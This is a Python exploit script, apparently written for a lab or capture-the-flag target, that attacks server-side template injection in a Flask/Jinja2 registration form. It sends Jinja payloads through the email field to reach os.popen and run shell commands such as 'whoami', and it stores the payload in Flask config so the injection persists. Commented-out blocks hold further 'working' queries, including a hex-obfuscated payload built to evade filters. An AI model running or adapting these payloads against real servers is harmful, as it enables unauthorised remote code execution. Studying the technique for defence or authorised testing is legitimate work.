import requests
import socket
import time
from bs4 import BeautifulSoup


class JinjaNinja:
    target_url = ""
    request_params = {}
    ssti_param = ""
    http_method = ""
    my_ip = ""

    def __init__(self, ssti_target_url, request_params, ssti_param, http_method):
        self.ssti_target_url = ssti_target_url
        self.request_params = request_params
        self.ssti_param = ssti_param
        self.http_method = http_method
        self.my_ip = socket.gethostbyname(socket.gethostname())

    def do_ssti(self, ssti_query):
        result = ""

        self.request_params[self.ssti_param] = ssti_query

        if self.http_method == "get":
            result = requests.get(url=self.ssti_target_url,
                                  params=self.request_params).text

        elif self.http_method == "post":
            headers = {
                'Host': self.my_ip,
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Referer': self.ssti_target_url,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': str(len(ssti_query)),
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1'
            }

            result = requests.post(url=self.ssti_target_url,
                                   data=self.request_params,
                                   headers=headers,
                                   timeout=3).text

        else:
            print("Invalid http_method: '{}'".format(self.http_method))

        time.sleep(3)
        return result

    def find_subclass_index(self, subclass_name):
        # Find the index of the "os._wrap_close" subclass:
        # 133 = os._wrap_close
        print("[+] Searching for: '{}'".format(subclass_name))
        subclass_index = ""
        ssti_query = "{{g.__class__.__mro__[1].__subclasses__()|safe}}"
        result = self.do_ssti(ssti_query)
        for index, elem in enumerate(result.split(',')):
             if subclass_name in elem:
                 subclass_index = str(index)
                 print("subclass_index {} => {}".format(index, elem))
        return subclass_index

    def pwn(self, subclass_index):
        long_ssti_query = "().__class__.__base__.__subclasses__().__getitem__(" + subclass_index + ").__init__.__globals__.__getitem__('popen')('whoami').read()"

        print("[+] Testing command")
        ssti_query = '"{{' + long_ssti_query + '}}"@f.uk'
        result = self.do_ssti(ssti_query)
        parse_result(result)

        print("[+] Persisting command in flask config")
        self.request_params['x'] = long_ssti_query
        ssti_query = '"{{config.update({1:request.query_string})}}"@f.uk'
        result = self.do_ssti(ssti_query)
        parse_result(result)

        print("[+] Verifying command persistence")
        ssti_query = '"{{config[1]}}"@f.uk'
        result = self.do_ssti(ssti_query)
        parse_result(result)

        print("[+] Calling persistent command")
        ssti_query = '"{{{{config[\'A\']|e}}"@f.uk'
        result = self.do_ssti(ssti_query)
        parse_result(result)

        return result



"""
<div class="form-group has-error">
  <div class="form-group">
    <label for="email">Email</label>
    <input class="form-control" id="email" name="email" placeholder="Email" required type="text" value="{{__class__}}@f.uk">
      <p class="help-block">Email @f.uk already registered. Please log in <a href="/user/login">here</a>.</p>     
    </div>
</div>
"""


def parse_result(result):
    if "Invalid email address" in result:
        print("Invalid email address")
    elif "Internal Server Error" in result:
        print("Internal Server Error")
    else:
        soup = BeautifulSoup(result, 'html.parser')
        print(soup.findAll('div', attrs={'class': 'form-group'})[1].findChildren()[2].text[6:].split('@')[0])


def main():
    # HTTP request details
    ssti_target_url = "http://localhost:5000/user/register"
    request_params = {'email': 'foo', 'password': '123456', 'confirm': '123456'}
    ssti_param = 'email'
    http_method = "post"

    # Exploit details
    subclass_name = "os._wrap_close"

    # Use those ninja skillz ;-)
    jn = JinjaNinja(ssti_target_url, request_params, ssti_param, http_method)
    idx = jn.find_subclass_index(subclass_name)
    result = jn.pwn(idx)

    # Make life easier :-)
    #parse_result(result)


if __name__ == "__main__":
    main()


#
# #########-----------------------------------------------*
#
# x = "config['res']='hurrah'"
#
# # Write x to the config
# #query = "{{config.update({'A':request.form.x})}}@f.uk"
# #result = requests.get(url=url + "/?email=" + query + "&x=" + x).text
# #print(result)
#
# # Run x from config
# query = "{{config.from_object(config['A'])}}@f.uk"
# result = requests.get(url=url + "/?email=" + query).text
# print(result)
#
# # Check result x from config
# query = "{{config['res']}}@f.uk"
# result = requests.get(url=url + "/?email=" + query).text
# print(result)

# working
#### working query ####
#query = "{{g.__class__.__mro__[1].__subclasses__()[480]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}"
#result = requests.get(url=url + "/?email=" + query).text
#print(result)

#### working query - obfuscated
# subclass 133 = os._wrap_close
# ".x" --> "|attr('x')"
# "__x__" --> "\x5f\x5fx\x5f\x5f"
# "'" --> "\x27"
# "|" --> "\x7c"
# "(" --> "\x28"
# "(" --> "\x29"
# "attr" --> "\x61\x74\x74\x72"
# "class" --> "\x61\x6c\x61\x73\x73"
# "subclasses" --> "\x73\x75\x62\x61\x6c\x61\x73\x73\x65\x73"
# "base" --> "\x62\x61\x73\x65"
# "read" = "\x72\x65\x61\x64"
# "init" = "\x69\x6e\x69\x74"
# "popen" = "\x70\x6f\x70\x65\x6e"
# "getitem" = "\x67\x65\x74\x69\x74\x65\x6d"
# "globals" = "\x67\x6c\x6f\x62\x61\x6c\x73"
# "133" = "\x31\x33\x33"
#query = "{{\x28\x29\x7c\x61\x74\x74\x72\x28\x27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f\x27\x29\x7c\x61\x74\x74\x72\x28\x27\x5f\x5f\x62\x61\x73\x65\x5f\x5f\x27\x29\x7c\x61\x74\x74\x72\x28\x27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f\x27\x29\x28\x29\x7c\x61\x74\x74\x72\x28\x27\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f\x27\x29\x28\x31\x33\x33\x29\x7c\x61\x74\x74\x72\x28\x27\x5f\x5f\x69\x6e\x69\x74\x5f\x5f\x27\x29\x7c\x61\x74\x74\x72\x28\x27\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f\x27\x29\x7c\x61\x74\x74\x72\x28\x27\u005f\u005f\x67\x65\x74\x69\x74\x65\x6d\u005f\u005f\x27\x29\x28\x27\x70\x6f\x70\x65\x6e\x27\x29\x28\x27whoami\x27\x29\x7c\x61\x74\x74\x72\x28\x27\x72\x65\x61\x64\x27\x29\x28\x29}}"
#result = requests.get(url=url + "/?email=" + query).text
#print(result)

